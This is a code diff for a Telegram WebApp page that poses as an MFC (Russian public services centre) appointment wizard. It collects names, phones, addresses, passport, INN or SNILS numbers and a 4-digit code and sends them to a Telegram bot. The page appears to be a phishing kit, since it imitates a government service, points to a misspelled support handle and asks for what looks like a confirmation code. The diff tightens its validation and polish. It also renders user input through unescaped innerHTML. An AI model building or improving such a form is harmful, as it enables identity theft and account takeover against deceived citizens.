@@ -137,23 +137,31 @@
   </div>
 
   <script>
-    // ——— безопасная отправка в бота без дублей ———
+    // ——— Безопасная отправка в бота без дублей ———
     let __lastSent = "";
-    function sendToBotOnce(rec){
-      const tg = window.Telegram && window.Telegram.WebApp;
-      if (!tg) return; // если открыто НЕ из Telegram — просто покажем превью
-      try{
+    function sendToBotOnce(rec) {
+      const tg = window.Telegram?.WebApp;
+      if (!tg) {
+        console.log("Telegram WebApp not available, showing preview only");
+        alert("Данные сохранены локально:\n" + JSON.stringify(rec, null, 2));
+        return;
+      }
+      try {
         const json = JSON.stringify({ type: "lead", payload: rec });
         if (json === __lastSent) return;
         tg.ready();
         tg.sendData(json);
         tg.HapticFeedback?.impactOccurred?.("light");
         __lastSent = json;
-      }catch(e){ console.warn("sendData error:", e); }
+        console.log("Data sent to Telegram:", json);
+      } catch (e) {
+        console.error("sendData error:", e);
+        alert("Ошибка при отправке данных. Попробуйте снова.");
+      }
     }
 
-    class MFCWizard{
-      constructor(){
+    class MFCWizard {
+      constructor() {
         this.steps = document.querySelectorAll(".step");
         this.currentStep = "main";
         this.formData = {};
@@ -163,103 +171,222 @@
         this.show("main");
       }
 
-      initEvents(){
+      initEvents() {
         const root = document.getElementById("wizard");
-        if(!root) return;
-        root.addEventListener("click",(e)=>{
+        if (!root) {
+          console.error("Wizard container not found");
+          return;
+        }
+        root.addEventListener("click", (e) => {
           const t = e.target.closest("button");
           if (!t) return;
           if (t.classList.contains("next")) this.next();
           else if (t.classList.contains("back")) this.back();
           else if (t.classList.contains("menu-btn")) this.menu(t.dataset.action, t.dataset.doc);
         });
-        ["fullname","phone","address","docnumber","code"].forEach(id=>{
+        ["fullname", "phone", "address", "docnumber", "code"].forEach((id) => {
           const el = document.getElementById(id);
-          el && el.addEventListener("input",()=>this.validate(this.currentStep));
+          if (el) {
+            el.addEventListener("input", () => this.validate(this.currentStep));
+            // Добавляем обработку нажатия Enter для перехода к следующему шагу
+            el.addEventListener("keypress", (e) => {
+              if (e.key === "Enter") {
+                e.preventDefault();
+                this.next();
+              }
+            });
+          }
         });
       }
 
-      updateWelcome(){
+      updateWelcome() {
         const el = document.getElementById("welcome-message");
-        const tg = window.Telegram && window.Telegram.WebApp;
+        const tg = window.Telegram?.WebApp;
         let name = "Гость";
-        try{
+        try {
           const u = tg?.initDataUnsafe?.user;
-          if (u) name = [u.first_name,u.last_name].filter(Boolean).join(" ") || u.username || "Гость";
-        }catch(_){}
+          if (u) name = [u.first_name, u.last_name].filter(Boolean).join(" ") || u.username || "Гость";
+        } catch (e) {
+          console.warn("Error accessing Telegram user data:", e);
+        }
         if (el) el.textContent = `📋 Добро пожаловать, ${name}! 👋`;
       }
 
-      show(id){
-        this.steps.forEach(s => s.classList.toggle("active", s.id === `step-${id}`));
+      show(id) {
+        this.steps.forEach((s) => s.classList.toggle("active", s.id === `step-${id}`));
         this.currentStep = id;
-        window.scrollTo({top:0, behavior:"smooth"});
+        // Очистка ошибок при переходе на новый шаг
+        const errorFields = ["err-fullname", "err-phone", "err-address", "err-doc", "err-code"];
+        errorFields.forEach((id) => {
+          const el = document.getElementById(id);
+          if (el) el.textContent = "";
+        });
+        window.scrollTo({ top: 0, behavior: "smooth" });
+        // Фокус на первом поле ввода
+        const input = document.querySelector(`#step-${id} input`);
+        if (input) input.focus();
       }
 
-      next(){
+      next() {
         if (!this.validate(this.currentStep)) return;
-        if (this.currentStep === "fullname"){ this.formData.fullname = (fullname.value||"").trim(); return this.show("phone"); }
-        if (this.currentStep === "phone"){ this.formData.phone = (phone.value||"").trim(); return this.show("address"); }
-        if (this.currentStep === "address"){ this.formData.address = (address.value||"").trim(); return this.show("document-type"); }
-        if (this.currentStep === "document-number"){ this.formData["document-number"] = (docnumber.value||"").trim(); return this.show("code"); }
-        if (this.currentStep === "code"){ this.formData.code = (code.value||"").trim(); return this.send(); }
+        if (this.currentStep === "fullname") {
+          this.formData.fullname = (document.getElementById("fullname").value || "").trim();
+          return this.show("phone");
+        }
+        if (this.currentStep === "phone") {
+          this.formData.phone = (document.getElementById("phone").value || "").trim();
+          return this.show("address");
+        }
+        if (this.currentStep === "address") {
+          this.formData.address = (document.getElementById("address").value || "").trim();
+          return this.show("document-type");
+        }
+        if (this.currentStep === "document-number") {
+          this.formData["document-number"] = (document.getElementById("docnumber").value || "").trim();
+          return this.show("code");
+        }
+        if (this.currentStep === "code") {
+          this.formData.code = (document.getElementById("code").value || "").trim();
+          return this.send();
+        }
       }
 
-      back(){
-        const map = {fullname:"main", phone:"fullname", address:"phone", "document-type":"address", "document-number":"document-type", code:"document-number"};
+      back() {
+        const map = {
+          fullname: "main",
+          phone: "fullname",
+          address: "phone",
+          "document-type": "address",
+          "document-number": "document-type",
+          code: "document-number",
+        };
         this.show(map[this.currentStep] || "main");
       }
 
-      menu(action, doc){
+      menu(action, doc) {
         if (action === "schedule") return this.show("fullname");
         if (action === "documents") return alert("Список документов: Паспорт, ИНН, СНИЛС, выписка ЕГРН.");
         if (action === "check-status") return alert("Проверка статуса недоступна в демо.");
-        if (action === "contact") return location.href = "https://t.me/MFC_SUPPOR";
+        if (action === "contact") {
+          try {
+            window.location.href = "https://t.me/MFC_SUPPOR";
+          } catch (e) {
+            console.error("Error navigating to contact:", e);
+            alert("Ошибка при переходе к поддержке. Попробуйте снова.");
+          }
+          return;
+        }
         if (action === "faq") return alert("FAQ в разработке.");
-        if (action === "show-data"){
-          document.getElementById("data-output").classList.add("active");
+        if (action === "show-data") {
+          const dataOutput = document.getElementById("data-output");
+          if (dataOutput) dataOutput.classList.add("active");
           const last = this.dataStore[this.dataStore.length - 1];
           if (last) sendToBotOnce(last);
           return;
         }
-        if (doc){
+        if (doc) {
           this.formData["document-type"] = doc;
-          const ex = {"Паспорт":"Пример: 4510 123456","ИНН":"Пример: 500100732259","СНИЛС":"Пример: 112-233-445 95"};
-          document.getElementById("doc-example").textContent = ex[doc] || "";
+          const ex = {
+            Паспорт: "Пример: 4510 123456",
+            ИНН: "Пример: 500100732259",
+            СНИЛС: "Пример: 112-233-445 95",
+          };
+          const docExample = document.getElementById("doc-example");
+          if (docExample) docExample.textContent = ex[doc] || "";
+          const docTitle = document.getElementById("doc-title");
+          if (docTitle) docTitle.textContent = `🔢 Введите номер документа (${doc})`;
           return this.show("document-number");
         }
       }
 
-      validate(step){
-        const e = (id)=>document.getElementById(id);
-        if (step==="fullname"){ const v=(e("fullname").value||"").trim(); if(!v){ e("err-fullname").textContent="Укажите ФИО"; return false } e("err-fullname").textContent=""; return true; }
-        if (step==="phone"){ const v=(e("phone").value||"").trim(); if(!/^[+]?\\d[\\d\\s\\-()]{6,}$/.test(v)){ e("err-phone").textContent="Укажите корректный телефон"; return false } e("err-phone").textContent=""; return true; }
-        if (step==="address"){ const v=(e("address").value||"").trim(); if(!v){ e("err-address").textContent="Укажите адрес"; return false } e("err-address").textContent=""; return true; }
-        if (step==="document-number"){ const v=(e("docnumber").value||"").trim(); if(!v){ e("err-doc").textContent="Введите номер документа"; return false } e("err-doc").textContent=""; return true; }
-        if (step==="code"){ const v=(e("code").value||"").trim(); if(!/^\\d{4}$/.test(v)){ e("err-code").textContent="Код должен быть 4 цифры"; return false } e("err-code").textContent=""; return true; }
+      validate(step) {
+        const e = (id) => document.getElementById(id);
+        if (step === "fullname") {
+          const v = (e("fullname")?.value || "").trim();
+          if (!v || v.split(" ").length < 2) {
+            e("err-fullname").textContent = "Укажите полное ФИО (имя и фамилия минимум)";
+            return false;
+          }
+          e("err-fullname").textContent = "";
+          return true;
+        }
+        if (step === "phone") {
+          const v = (e("phone")?.value || "").trim();
+          if (!/^\+?\d[\d\s\-()]{6,}$/.test(v)) {
+            e("err-phone").textContent = "Укажите корректный телефон (минимум 7 цифр)";
+            return false;
+          }
+          e("err-phone").textContent = "";
+          return true;
+        }
+        if (step === "address") {
+          const v = (e("address")?.value || "").trim();
+          if (!v || v.length < 10) {
+            e("err-address").textContent = "Укажите полный адрес (город, улица, дом)";
+            return false;
+          }
+          e("err-address").textContent = "";
+          return true;
+        }
+        if (step === "document-number") {
+          const v = (e("docnumber")?.value || "").trim();
+          const docType = this.formData["document-type"] || "";
+          if (!v) {
+            e("err-doc").textContent = "Введите номер документа";
+            return false;
+          }
+          // Дополнительная валидация в зависимости от типа документа
+          if (docType === "Паспорт" && !/^\d{4}\s?\d{6}$/.test(v)) {
+            e("err-doc").textContent = "Номер паспорта: 4 цифры, пробел, 6 цифр";
+            return false;
+          }
+          if (docType === "ИНН" && !/^\d{12}$/.test(v)) {
+            e("err-doc").textContent = "ИНН должен содержать 12 цифр";
+            return false;
+          }
+          if (docType === "СНИЛС" && !/^\d{3}-\d{3}-\d{3}\s?\d{2}$/.test(v)) {
+            e("err-doc").textContent = "СНИЛС: 11 цифр в формате XXX-XXX-XXX XX";
+            return false;
+          }
+          e("err-doc").textContent = "";
+          return true;
+        }
+        if (step === "code") {
+          const v = (e("code")?.value || "").trim();
+          if (!/^\d{4}$/.test(v)) {
+            e("err-code").textContent = "Код должен быть 4 цифры";
+            return false;
+          }
+          e("err-code").textContent = "";
+          return true;
+        }
         return true;
       }
 
-      send(){
+      send() {
         const rec = {
-          timestamp: new Date().toISOString().slice(0,19).replace("T"," "),
+          timestamp: new Date().toISOString().slice(0, 19).replace("T", " "),
           fullname: this.formData.fullname || "",
           phone: this.formData.phone || "",
           address: this.formData.address || "",
-          document: `${this.formData["document-type"]||""} ${this.formData["document-number"]||""}`.trim(),
-          code: this.formData.code || ""
+          document: `${this.formData["document-type"] || ""} ${this.formData["document-number"] || ""}`.trim(),
+          code: this.formData.code || "",
         };
         sendToBotOnce(rec);
         this.dataStore.push(rec);
         this.renderTable();
-        document.getElementById("data-output").classList.add("active");
+        const dataOutput = document.getElementById("data-output");
+        if (dataOutput) dataOutput.classList.add("active");
+        this.formData = {}; // Сбрасываем форму после отправки
         this.show("main");
+        alert("Данные успешно отправлены!");
       }
 
-      renderTable(){
+      renderTable() {
         const tbody = document.getElementById("data-table-body");
+        if (!tbody) return;
         tbody.innerHTML = "";
-        this.dataStore.forEach(r=>{
+        this.dataStore.forEach((r) => {
           const tr = document.createElement("tr");
           tr.innerHTML = `<td>${r.timestamp}</td><td>${r.fullname}</td><td>${r.phone}</td><td>${r.address}</td><td>${r.document}</td><td>${r.code}</td>`;
           tbody.appendChild(tr);
@@ -268,7 +395,12 @@
     }
 
     // Инициализация
-    new MFCWizard();
+    try {
+      new MFCWizard();
+    } catch (e) {
+      console.error("Failed to initialize MFCWizard:", e);
+      alert("Ошибка инициализации приложения. Попробуйте перезагрузить страницу.");
+    }
   </script>
 </body>
 </html>
